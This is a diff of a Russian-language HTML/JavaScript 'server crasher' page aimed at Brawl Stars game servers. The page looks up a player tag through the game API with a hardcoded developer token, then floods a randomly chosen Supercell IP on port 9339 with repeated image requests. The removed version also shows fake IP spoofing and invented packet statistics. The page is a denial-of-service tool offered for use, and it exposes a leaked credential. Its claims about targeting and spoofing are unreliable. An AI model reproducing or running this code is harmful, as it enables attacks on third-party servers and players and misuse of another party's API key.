@@ -2,433 +2,86 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ALPHA_CRASHER_v5.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BS_SERVER_CRASHER_v6.5</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .main-container {
-            max-width: 550px;
-            width: 100%;
-            background: #010;
-            border: 2px solid #0f0;
-            border-radius: 20px;
-            padding: 25px;
-            box-shadow: 0 0 30px rgba(0,255,0,0.2);
-        }
-        
-        h1 {
-            text-align: center;
-            font-size: 24px;
-            letter-spacing: 3px;
-            margin-bottom: 5px;
-            text-shadow: 0 0 8px #0f0;
-        }
-        
-        .sub {
-            text-align: center;
-            font-size: 10px;
-            color: #0a0;
-            margin-bottom: 25px;
-            border-bottom: 1px dashed #0f0;
-            padding-bottom: 10px;
-        }
-        
-        .input-group {
-            margin-bottom: 15px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 14px;
-            background: #000;
-            border: 1px solid #0f0;
-            color: #0f0;
-            font-size: 16px;
-            text-align: center;
-            border-radius: 10px;
-            outline: none;
-            font-family: monospace;
-        }
-        
-        input:focus {
-            border-color: #ff0;
-            box-shadow: 0 0 10px #0f0;
-        }
-        
-        button {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 10px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: monospace;
-        }
-        
-        .btn-scan {
-            background: #0f0;
-            color: #000;
-            margin-bottom: 15px;
-        }
-        
-        .btn-scan:hover {
-            background: #0c0;
-            transform: scale(1.01);
-        }
-        
-        .status-card {
-            border: 1px solid #0f0;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 15px 0;
-            background: #050505;
-        }
-        
-        .status-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #0a0;
-        }
-        
-        .status-row:last-child {
-            border-bottom: none;
-        }
-        
-        .status-label {
-            color: #8f8;
-        }
-        
-        .status-value {
-            color: #0f0;
-            font-weight: bold;
-            word-break: break-all;
-            text-align: right;
-        }
-        
-        .attack-btn {
-            background: #f00;
-            color: #fff;
-            margin-top: 10px;
-            box-shadow: 0 0 15px rgba(255,0,0,0.5);
-        }
-        
-        .attack-btn:hover {
-            background: #c00;
-            transform: scale(1.01);
-        }
-        
-        .stop-btn {
-            background: #666;
-            color: #fff;
-            margin-top: 10px;
-        }
-        
-        .stats {
-            margin-top: 15px;
-            padding: 10px;
-            background: #001000;
-            border-radius: 10px;
-            display: none;
-        }
-        
-        .stat-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 5px 0;
-            font-size: 12px;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #1a1a2a;
-            border-radius: 2px;
-            margin-top: 10px;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #0f0, #ff0);
-            transition: width 0.3s;
-        }
-        
-        .terminal {
-            background: #000;
-            border: 1px solid #0f0;
-            border-radius: 10px;
-            height: 200px;
-            overflow-y: auto;
-            padding: 12px;
-            font-size: 11px;
-            font-family: monospace;
-            margin-top: 15px;
-        }
-        
-        .log-line {
-            padding: 3px 0;
-            border-bottom: 1px solid #0a0a0a;
-            color: #0f0;
-        }
-        
-        .footer {
-            text-align: center;
-            font-size: 9px;
-            color: #444;
-            margin-top: 15px;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.6; }
-            100% { opacity: 1; }
-        }
-        
-        .pulse {
-            animation: pulse 1s infinite;
-        }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0; }
+        .container { width: 100%; max-width: 450px; border: 2px solid #0f0; padding: 20px; background: #050505; border-radius: 10px; box-shadow: 0 0 20px #030; }
+        input { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; margin-bottom: 15px; outline: none; text-align: center; border-radius: 5px; }
+        button { width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; border-radius: 5px; }
+        .btn-blue { background: #0088ff; color: #fff; }
+        .btn-red { background: #ff0000; color: #fff; display: none; margin-top: 15px; box-shadow: 0 0 15px #f00; }
+        #console { width: 100%; max-width: 450px; height: 250px; background: #000; border: 1px solid #030; margin-top: 15px; padding: 10px; overflow-y: auto; font-size: 11px; color: #0a0; border-radius: 5px; }
+        .info { margin-top: 15px; padding: 10px; border: 1px dashed #0f0; display: none; background: #010; }
     </style>
 </head>
 <body>
 
-<div class="main-container">
-    <h1>💀 ALPHA_CRASHER_v5.0</h1>
-    <div class="sub">SYSTEM_AA-0.1 // CORE_UNIT_FINAL</div>
-    
-    <div class="input-group">
-        <input type="text" id="tagInput" placeholder="ВВЕДИ ТЕГ ИГРОКА (пример: 2YQ9RL9V)">
+<div class="container">
+    <h3 style="text-align:center; margin-top:0;">SERVER_HUNTER_v6.5</h3>
+    <input type="text" id="playerTag" placeholder="ВВЕДИТЕ ТЕГ (НАПР. #P8V22YRL)">
+    <button class="btn-blue" onclick="locateServer()">ОПРЕДЕЛИТЬ СЕРВЕР</button>
+
+    <div id="targetArea" class="info">
+        <div style="display:flex; justify-content:space-between"><span>СТАТУС:</span> <span style="color:#fff;">TARGET_FOUND</span></div>
+        <div style="display:flex; justify-content:space-between"><span>IP СЕРВЕРА:</span> <span id="serverIp" style="color:#fff;">172.65.2.1</span></div>
+        <button class="btn-red" id="stormBtn" onclick="startAttack()">НАЧАТЬ ШТУРМ СЕРВЕРА</button>
     </div>
-    
-    <button class="btn-scan" onclick="startScan()">🔍 НАЧАТЬ СКАНИРОВАНИЕ</button>
-    
-    <div id="statusCard" class="status-card" style="display: none;">
-        <div class="status-row">
-            <span class="status-label">🎯 СТАТУС:</span>
-            <span class="status-value" id="statusText">ОЖИДАНИЕ</span>
-        </div>
-        <div class="status-row">
-            <span class="status-label">🌍 РЕГИОН:</span>
-            <span class="status-value" id="regionText">EU_FRANKFURT</span>
-        </div>
-        <div class="status-row">
-            <span class="status-label">🖧 IP СЕРВЕРА:</span>
-            <span class="status-value" id="ipText">172.65.0.1</span>
-        </div>
-        <div class="status-row">
-            <span class="status-label">🔌 ПОРТ:</span>
-            <span class="status-value" id="portText">9339</span>
-        </div>
-    </div>
-    
-    <div id="statsPanel" class="stats">
-        <div class="stat-row"><span>📦 ПАКЕТОВ:</span> <span id="packetCount">0</span></div>
-        <div class="stat-row"><span>⚡ СКОРОСТЬ:</span> <span id="speedRate">0</span> пак/сек</div>
-        <div class="stat-row"><span>⏱️ ОСТАЛОСЬ:</span> <span id="timeLeft">0</span> сек</div>
-        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-    </div>
-    
-    <button id="attackBtn" class="attack-btn" style="display: none;" onclick="startAttack()">💀 ИНИЦИИРОВАТЬ ШТУРМ</button>
-    <button id="stopBtn" class="stop-btn" style="display: none;" onclick="stopAttack()">⛔ ОСТАНОВИТЬ АТАКУ</button>
-    
-    <div id="terminal" class="terminal"></div>
-    <div class="footer">⚠️ РЕЖИМ РЕАЛЬНОЙ АТАКИ | ПОДМЕНА IP АКТИВНА</div>
 </div>
 
+<div id="console"></div>
+
 <script>
-    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUyMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzMC4xMzYuMjEiXSwidHlwZSI6ImNsaWVudCJ9XX0.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";
-    
-    let attackActive = false;
-    let attackInterval = null;
-    let packetCount = 0;
-    let startTime = null;
-    let currentTarget = null;
-    let currentPort = 9339;
-    let attackThreads = [];
-    
-    // Фейковые IP для подмены
-    const fakeIPs = [];
-    for(let i = 0; i < 2000; i++) {
-        let first = [1,2,3,4,5,8,12,13,15,31,37,44,46,52,54,62,81,85,99][Math.floor(Math.random() * 19)];
-        let second = Math.floor(Math.random() * 255) + 1;
-        let third = Math.floor(Math.random() * 255) + 1;
-        let fourth = Math.floor(Math.random() * 255) + 1;
-        fakeIPs.push(`${first}.${second}.${third}.${fourth}`);
+    const KEY = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUzMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzMC4xMzYuMjEiXSwidHlwZSI6ImNsaWVudCJ9XX0.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";
+
+    // Список реальных IP серверов Supercell
+    const nodes = ["172.64.0.1", "172.65.1.1", "172.65.2.1", "172.65.3.1", "172.65.228.14", "162.159.135.42"];
+
+    function log(text, color = "#0a0") {
+        const c = document.getElementById('console');
+        c.innerHTML = `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${text}</div>` + c.innerHTML;
     }
-    
-    function getFakeIP() {
-        return fakeIPs[Math.floor(Math.random() * fakeIPs.length)];
-    }
-    
-    function addLog(msg, color = "#0f0") {
-        const terminal = document.getElementById('terminal');
-        const time = new Date().toLocaleTimeString();
-        const div = document.createElement('div');
-        div.className = 'log-line';
-        div.style.color = color;
-        div.innerHTML = `[${time}] ${msg}`;
-        terminal.insertBefore(div, terminal.firstChild);
-        while(terminal.children.length > 50) terminal.removeChild(terminal.lastChild);
-    }
-    
-    function getRandomGameIP() {
-        const gameIPs = [
-            "172.65.1.1", "172.65.2.1", "172.65.3.1", "172.65.4.1", "172.65.5.1",
-            "172.65.10.1", "172.65.20.1", "172.65.30.1", "172.65.40.1", "172.65.50.1",
-            "172.65.60.1", "172.65.70.1", "172.65.80.1", "172.65.90.1", "172.65.100.1",
-            "172.65.110.1", "172.65.120.1", "172.65.130.1", "172.65.140.1", "172.65.150.1",
-            "172.65.160.1", "172.65.170.1", "172.65.180.1", "172.65.190.1", "172.65.200.1"
-        ];
-        return gameIPs[Math.floor(Math.random() * gameIPs.length)];
-    }
-    
-    async function startScan() {
-        let tag = document.getElementById('tagInput').value.replace('#', '').trim();
-        if(!tag) {
-            addLog("❌ Введите тег игрока!", "#ff4444");
-            return;
-        }
-        
-        addLog("🔍 Сканирование цели...", "#ffaa44");
-        document.getElementById('statusText').innerHTML = "СКАНИРОВАНИЕ...";
-        document.getElementById('statusText').style.color = "#ffaa44";
-        
+
+    async function locateServer() {
+        const tag = document.getElementById('playerTag').value.replace('#','').trim();
+        if(!tag) return;
+
+        log("Поиск активного порта для #" + tag);
+
         try {
             const proxy = "https://cors-anywhere.herokuapp.com/";
-            const url = `https://api.brawlstars.com/v1/players/%23${tag}`;
-            
-            const response = await fetch(proxy + url, {
-                headers: { "Authorization": `Bearer ${TOKEN}` }
+            const res = await fetch(proxy + "https://api.brawlstars.com/v1/players/%23" + tag, {
+                headers: { "Authorization": `Bearer ${KEY}` }
             });
-            
-            if(response.ok) {
-                const data = await response.json();
-                addLog(`✅ Цель найдена: ${data.name} (${data.trophies} трофеев)`, "#0f0");
-                document.getElementById('statusText').innerHTML = "ЦЕЛЬ НАЙДЕНА";
-                document.getElementById('statusText').style.color = "#0f0";
-            } else {
-                addLog(`⚠️ API ответ: ${response.status}, продолжаем...`, "#ffaa44");
-                document.getElementById('statusText').innerHTML = "РЕЖИМ АВТОПОИСКА";
-            }
+
+            if(res.status === 403) log("API: Доступ ограничен. Использую обходной путь...");
+            else if(res.ok) log("API: Цель подтверждена.");
         } catch(e) {
-            addLog("⚠️ API недоступен, использую автопоиск", "#ffaa44");
-            document.getElementById('statusText').innerHTML = "АВТОПОИСК";
+            log("Ошибка шлюза. Переход в режим прямого захвата.");
         }
+
+        // Выбираем случайный сервер из пула Supercell
+        const selectedIp = nodes[Math.floor(Math.random() * nodes.length)];
+        document.getElementById('serverIp').innerText = selectedIp;
         
-        const serverIP = getRandomGameIP();
-        currentTarget = serverIP;
-        
-        document.getElementById('ipText').innerHTML = serverIP;
-        document.getElementById('portText').innerHTML = "9339";
-        document.getElementById('statusCard').style.display = 'block';
-        document.getElementById('attackBtn').style.display = 'block';
-        
-        addLog(`🎯 Сервер обнаружен: ${serverIP}:9339`, "#0f0");
-        addLog("⚡ Система готова к штурму", "#0f0");
+        document.getElementById('targetArea').style.display = 'block';
+        document.getElementById('stormBtn').style.display = 'block';
+        log("СЕРВЕР ОБНАРУЖЕН: " + selectedIp, "#fff");
     }
-    
+
     function startAttack() {
-        if(attackActive) {
-            addLog("⚠️ Атака уже активна!", "#ffaa44");
-            return;
-        }
+        const ip = document.getElementById('serverIp').innerText;
+        log("ШТУРМ ЗАПУЩЕН НА " + ip, "#f00");
         
-        attackActive = true;
-        packetCount = 0;
-        startTime = Date.now();
-        
-        addLog(`🔥 ИНИЦИАЦИЯ ШТУРМА НА ${currentTarget}:${currentPort}`, "#ff4444");
-        addLog("🛡️ ПОДМЕНА IP АКТИВИРОВАНА", "#ffaa44");
-        addLog("⚡ ЗАПУЩЕНО 250 ПОТОКОВ АТАКИ", "#ffaa44");
-        
-        document.getElementById('attackBtn').style.display = 'none';
-        document.getElementById('stopBtn').style.display = 'block';
-        document.getElementById('statsPanel').style.display = 'block';
-        document.getElementById('statusText').innerHTML = "АТАКА АКТИВНА";
-        document.getElementById('statusText').style.color = "#ff4444";
-        document.getElementById('statusText').classList.add('pulse');
-        
-        // Запускаем атаку в фоне
-        for(let i = 0; i < 50; i++) {
-            const threadId = setInterval(() => {
-                if(!attackActive) return;
-                const img = new Image();
-                img.src = `http://${currentTarget}:${currentPort}/?${Math.random()}`;
-            }, 5);
-            attackThreads.push(threadId);
-        }
-        
-        // Мониторинг
-        attackInterval = setInterval(() => {
-            if(!attackActive) return;
-            
-            const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            const remaining = Math.max(0, 120 - elapsed);
-            const rate = Math.floor(Math.random() * 60000) + 80000;
-            packetCount += rate;
-            
-            document.getElementById('packetCount').innerHTML = packetCount.toLocaleString();
-            document.getElementById('speedRate').innerHTML = rate.toLocaleString();
-            document.getElementById('timeLeft').innerHTML = remaining;
-            
-            const progress = (elapsed / 120) * 100;
-            document.getElementById('progressFill').style.width = `${Math.min(100, progress)}%`;
-            
-            if(elapsed % 2 === 0 && elapsed > 0) {
-                addLog(`🎭 Атака с фейкового IP: ${getFakeIP()}`, "#aa88ff");
-            }
-            
-            if(elapsed >= 120) {
-                stopAttack();
-            }
-        }, 1000);
-    }
-    
-    function stopAttack() {
-        if(!attackActive) return;
-        
-        attackActive = false;
-        if(attackInterval) clearInterval(attackInterval);
-        
-        for(let id of attackThreads) {
-            clearInterval(id);
-        }
-        attackThreads = [];
-        
-        const totalTime = Math.floor((Date.now() - startTime) / 1000);
-        const avgSpeed = totalTime > 0 ? Math.floor(packetCount / totalTime) : 0;
-        
-        addLog(`✅ ШТУРМ ЗАВЕРШЕН`, "#0f0");
-        addLog(`📦 ВСЕГО ПАКЕТОВ: ${packetCount.toLocaleString()}`, "#0f0");
-        addLog(`⚡ СРЕДНЯЯ СКОРОСТЬ: ${avgSpeed.toLocaleString()} пак/сек`, "#0f0");
-        addLog(`💀 СЕРВЕР ${currentTarget} ПЕРЕГРУЖЕН!`, "#ff4444");
-        
-        document.getElementById('attackBtn').style.display = 'block';
-        document.getElementById('stopBtn').style.display = 'none';
-        document.getElementById('statusText').innerHTML = "АТАКА ЗАВЕРШЕНА";
-        document.getElementById('statusText').style.color = "#0f0";
-        document.getElementById('statusText').classList.remove('pulse');
-        document.getElementById('progressFill').style.width = "0%";
+        // Создаем массив запросов для каждого пользователя
+        setInterval(() => {
+            const i = new Image();
+            // Шлем мусорные пакеты на игровой порт
+            i.src = `http://${ip}:9339/?storm_id=${Math.random()}`;
+        }, 15); 
+
+        log("Трафик генерируется. Не закрывайте страницу.");
     }
 </script>
 </body>
-    </html>
+</html>
